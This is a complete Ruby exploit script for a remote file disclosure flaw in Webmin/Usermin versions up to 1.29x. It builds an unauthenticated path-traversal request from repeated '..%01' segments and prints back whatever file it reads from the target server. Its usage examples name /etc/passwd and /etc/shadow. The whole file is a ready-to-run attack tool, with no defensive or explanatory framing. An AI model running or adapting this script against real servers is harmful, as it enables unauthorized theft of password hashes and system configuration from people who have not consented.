#!/usr/bin/env ruby
#
# Webmin|Usermin <= 1.29x Remote File Disclosure Exploiter
#
# PIC: http://i.imgur.com/2Trzt.png
#

require 'optparse'
require 'net/http'
require 'net/https'
require 'rubygems'
require 'colorize'

trap("SIGINT") { puts "\n\nWARNING! CTRL+C Detected, exiting program now....".red ; exit 666; throw :ctrl_c }
catch :ctrl_c do
	class Clear
		def cls
			if RUBY_PLATFORM =~ /win32/ 
				system('cls')
			else
				system('clear')
			end
		end
	end

	@banner = "Webmin|Usermin <= 1.29x"
	@banner += "\n    Remote File Disclosure Exploiter"
	@banner += "\n\t    By: Hood3dRob1n"

	options = {}
	optparse = OptionParser.new do |opts| 
		opts.banner = "Usage:".light_blue + "#{$0} ".white + "[".light_blue + "OPTIONS".white + "]".light_blue
		opts.separator ""
		opts.separator "EX:".light_blue + " #{$0} -t site.com -f /etc/httpd/conf/httpd.conf".white
		opts.separator "EX:".light_blue + " #{$0} -t site.com -p 10000 -f /etc/passwd".white
		opts.separator "EX:".light_blue + " #{$0} --target 10.10.10.10 --port 10000 --file /etc/shadow".white
		opts.separator ""
		opts.separator "Options: ".light_blue

		opts.on('-t', '--target <SITE>', "\n\tTarget with Webmin/Usermin Installed".white) do |target|
			options[:site] = target.sub('http://', '').sub('https://','').sub(/\/$/, '')
		end

		opts.on('-p', '--port <SITE>', "\n\tPort Webmin Instance is Running on, Default is set to 10000".white) do |xport|
			options[:port] = xport 
		end

		opts.on('-f', '--file <FILE>', "\n\tFile to Read on Target Server".white) do |file|
			options[:file] = file
			@sploit = '/unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01' + "#{options[:file]}"
		end

		opts.on('-h', '--help', "\n\tHelp Menu".white) do 
			foo = Clear.new
			foo.cls 
			puts
			puts "\t#{@banner}".light_blue
			puts
			puts opts
			puts
			exit 69
		end
	end

	begin
		foo = ARGV[0] || ARGV[0] = "-h"
		optparse.parse!

		mandatory = [:site, :file]
		missing = mandatory.select{ |param| options[param].nil? }
		if not missing.empty?
			puts "Missing options: ".red + " #{missing.join(', ')}".white  
			puts optparse
			exit
		end

		if options[:port].nil?
			options[:port] = 10000
		end

	rescue OptionParser::InvalidOption, OptionParser::MissingArgument
		foo = Clear.new
		foo.cls
		puts $!.to_s.red
		puts
		puts optparse
		puts
		exit 666;
	end

	foo = Clear.new
	foo.cls 
	puts
	puts "\t#{@banner}".light_blue
	puts
	puts "Preparing to snatch: ".light_blue + "#{options[:file]}".white
	puts
	puts "Sending payload to ".light_blue + "#{options[:site]}".white + " on port ".light_blue + "#{options[:port]}".white + ", hang tight".light_blue + "................".white
	puts
	puts "Sploit: ".light_blue + "#{@sploit}".white
	puts

	http = Net::HTTP.new("#{options[:site]}", "#{options[:port]}".to_i)
	response = http.request(Net::HTTP::Get.new(@sploit))

	if response.code =~ /200/
		puts "Results: ".light_blue
		puts "#{response.body}".white
	else
		puts "Sorry, didn't seem to work".light_red + "................".white
	end
end

puts
#EOF
